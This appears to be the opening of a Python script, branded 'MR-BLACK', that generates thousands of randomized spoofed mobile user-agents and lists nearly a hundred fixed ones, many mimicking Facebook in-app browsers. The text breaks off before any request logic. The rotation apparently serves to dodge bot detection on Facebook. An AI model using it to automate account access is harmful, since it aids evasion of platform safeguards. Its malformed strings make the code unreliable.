import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
ugen=[]
 #------------------[ MR-BLACK ]-------------------#
for t in range(10000):
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5])
	ugen.append(uaku2)
for tx in range(10000):
	ua1='Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 [FBAN/FBIOS;FBAV/153.0.0.53.87;FBBV/84268146;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2.2;FBSS/2;FBCR/Telstra;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/86759280]'
	ua2='Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]'
	ua3='Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/166.0.0.66.95;]'
	ua4='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/166.0.0.53.95;FBBV/101310068;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Mobilis;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/0]'
	ua5='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/166.0.0.53.95;FBBV/101310068;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Orange;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/102694127]'
	ua6='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/166.0.0.53.95;FBBV/101310068;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Djezzy;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/102694127]'
	ua7='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/163.0.0.54.96;FBBV/96876057;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Orange;FBID/phone;FBLC/en_US;FBOP/45;FBRV/96876057]'
	ua8='Mozilla/5.0 (Linux; Android 5.0.2; vivo Y51 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]'
	ua9='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/167.0.0.50.95;FBBV/102293131;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Mobilis;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/0]'
	ua10='Mozilla/5.0 (Linux; Android 7.0; SM-G610F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/163.0.0.8.94;]'
	ua11='Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 [FBAN/FBIOS;FBAV/163.0.0.54.96;FBBV/96876057;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.3;FBSS/2;FBCR/inwi;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/99093507]'
	ua12='Mozilla/5.0 (Linux; Android 7.0; SM-G390F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]'
	ua13='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]'
	ua14='Mozilla/5.0 (Linux; Android 4.4.4; SM-G360H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/157.0.0.21.89;]'
	ua15='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/169.0.0.50.95;FBBV/104829965;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/2degrees;FBID/phone;FBLC/en_GB;FBOP/5;FBRV/0]'
	ua16='Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAN-L11 Build/HUAWEICAN-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua17='Mozilla/5.0 (Linux; Android 4.4.2; NB74 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/91.0.0.6.186;]'
	ua18='Mozilla/5.0 (Linux; Android 7.0; SM-J730G Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/87.0.0.7.184;]'
	ua19='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua20='Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/170.0.0.52.95;]'
	ua21='Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/155.0.0.36.96;]'
	ua22='Mozilla/5.0 (Linux; Android 7.0; LG-H990 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua23='Mozilla/5.0 (Linux; Android 7.0; SM-T585 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua24='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua25='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/169.0.0.50.95;FBBV/104829965;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/MegaFon;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]'
	ua26='Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua27='Mozilla/5.0 (Linux; Android 7.0; SM-J730FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua28='Mozilla/5.0 (Linux; Android 6.0; LENNY3 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]'
	ua29='Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/169.0.0.50.95;FBBV/104829965;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/lifecell;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]'
	ua30='Mozilla/5.0 (Linux; Android 5.1; M3s Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua31='Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua32='Mozilla/5.0 (Linux; Android 7.0; SM-N920P Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua33='Mozilla/5.0 (Linux; Android 8.0.0; SM-N950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/163.0.0.26.94;]'
	ua34='Mozilla/5.0 (Linux; Android 7.0; SM-J330F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua35='Mozilla/5.0 (Linux; Android 7.0; S60 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua36='Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua37='Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba'
	ua38='Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
	ua39='Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko'
	ua40='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
	ua41='Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36'
	ua42='Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36'
	ua43='Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X)Android 3.1.4;F2Q4ET) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.170.2.1506.337'
	ua44='Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
	ua45='Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'
	ua46='Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36'
	ua47='Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36'
	ua48='Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36'
	ua49='Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'
	ua50='Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'
	ua51='Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36'
	ua52='Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1'
	ua53='Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1'
	ua54='Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1'
	ua55='Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536'
	ua56='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1'
	ua57='Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058'
	ua58='Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'
	ua59='Mozilla/5.0 (Linux; Android 7.0; SM-A710F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/145.0.0.25.203;]'
	ua60='Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]'
	ua61='Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36'
	ua62='Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52'
	ua63='Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36'
	ua64='Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua65='Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua66='Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua67='Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua68='Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua69='Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua70='Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
	ua71='Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 YaBrowser/24.1.1.655 Mobile/15E148 Safari/604.1'
	ua72='Mozilla/5.0 (iPod touch; CPU iPhone 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 YaBrowser/24.1.0.2536 Mobile/15E148 Safari/605.1'
	ua73='Mozilla/5.0 (iPad; CPU OS 10_0 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14A346 Safari/E7FBAF'
	ua74='Mozilla/5.0 (iPad; CPU OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A456 Safari/602.1'
	ua75='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/120.0.2210.144'
	ua76='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
	ua77='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
	ua78='Mozilla/5.0 (Linux; Android 13; PHJ110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/440.0.0.31.105;]'
	ua79='Mozilla/5.0 (Linux; Android 11; PCEM00 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]'
	ua80='Mozilla/5.0 (Linux; Android 5.1; OPPO A37t Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]'
	ua81='Mozilla/5.0 (Linux; Android 13; CPH2499 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]'
	ua82='Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/364.0.0.10.112;]'
	ua83='Mozilla/5.0 (Linux; Android 11; SM-A525F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.29.71;]'
	ua84='Mozilla/5.0 (Linux; Android 12; 22071219AI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'
	ua85='Mozilla/5.0 (Linux; Android 13; 23046PNC9C Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]'
	ua86='Mozilla/5.0 (Linux; arm_64; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.328 YaBrowser/24.1.0.328.00 SA/3 Mobile Safari/537.36'
	ua87='Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586'
	ua88='Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36'
	ua89='Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1'
	ua90='Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1'
	ua91='Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1'
	ua92='Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1'
	ua93='Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1'
	ua94='Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1'
	ua95='Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
	ua96='Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36'
	ua97='Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36'
	ua98='Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
